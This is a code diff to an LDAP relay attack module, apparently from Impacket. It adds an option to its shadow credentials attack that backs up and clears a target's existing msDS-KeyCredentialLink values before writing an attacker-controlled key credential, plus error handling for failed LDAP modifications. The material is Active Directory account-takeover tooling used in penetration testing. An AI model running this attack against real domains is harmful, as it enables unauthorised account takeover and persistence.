@@ -276,6 +276,37 @@ class LDAPAttack(ProtocolAttack):
         else:
             LOG.error('Failed to add user to %s group: %s' % (groupName, str(self.client.result)))
 
+    def _backupShadowCredentials(self, target_name, existing_values):
+        backup_path = self.config.ShadowCredentialsBackupPath
+        if not backup_path:
+            sanitized_target_name = target_name.replace('\\', '_').replace('/', '_').replace(':', '_')
+            backup_path = '%s-keycredential.json' % sanitized_target_name
+        elif not backup_path.lower().endswith('.json'):
+            backup_path = '%s.json' % backup_path
+
+        backup_dir = os.path.dirname(backup_path)
+        if backup_dir and not os.path.exists(backup_dir):
+            os.makedirs(backup_dir, exist_ok=True)
+
+        key_credentials = []
+        for key_credential_value in existing_values:
+            if isinstance(key_credential_value, bytes):
+                key_credential_value = key_credential_value.decode('utf-8', errors='replace')
+            key_credentials.append(key_credential_value)
+
+        with codecs.open(backup_path, 'w', encoding='utf-8') as backup_file:
+            json.dump({'keyCredentials': key_credentials}, backup_file, indent=4)
+
+        LOG.info('Exported %d existing KeyCredential(s) to %s', len(key_credentials), backup_path)
+
+    def _handleShadowCredentialModifyError(self):
+        if self.client.result['result'] == 50:
+            LOG.error('Could not modify object, the server reports insufficient rights: %s' % self.client.result['message'])
+        elif self.client.result['result'] == 19:
+            LOG.error('Could not modify object, the server reports a constrained violation: %s' % self.client.result['message'])
+        else:
+            LOG.error('The server returned an error: %s' % self.client.result['message'])
+
 
     def shadowCredentialsAttack(self, domainDumper):
         currentShadowCredentialsTarget = self.config.ShadowCredentialsTarget
@@ -318,8 +349,24 @@ class LDAPAttack(ProtocolAttack):
         if not results:
             LOG.error('Could not query target user properties')
             return
+
         try:
-            new_values = results['raw_attributes']['msDS-KeyCredentialLink'] + [shadow_credentials.toDNWithBinary2String( keyCredential.dumpBinary(), target_dn )]
+            if self.config.ShadowCredentialsBackupAndClear:
+                existing_values = results['raw_attributes'].get('msDS-KeyCredentialLink', [])
+                LOG.info('Found %d existing KeyCredential(s) on target object', len(existing_values))
+                if len(existing_values) > 0:
+                    self._backupShadowCredentials(currentShadowCredentialsTarget, existing_values)
+
+                    LOG.info('Clearing existing msDS-KeyCredentialLink values')
+                    self.client.modify(target_dn, {'msDS-KeyCredentialLink': [ldap3.MODIFY_REPLACE, []]})
+                    if self.client.result['result'] != 0:
+                        self._handleShadowCredentialModifyError()
+                        return
+
+                new_values = [shadow_credentials.toDNWithBinary2String(keyCredential.dumpBinary(), target_dn)]
+            else:
+                new_values = results['raw_attributes']['msDS-KeyCredentialLink'] + [shadow_credentials.toDNWithBinary2String( keyCredential.dumpBinary(), target_dn )]
+
             LOG.info("Updating the msDS-KeyCredentialLink attribute of %s" % currentShadowCredentialsTarget)
             self.client.modify(target_dn, {'msDS-KeyCredentialLink': [ldap3.MODIFY_REPLACE, new_values]})
             if self.client.result['result'] == 0:
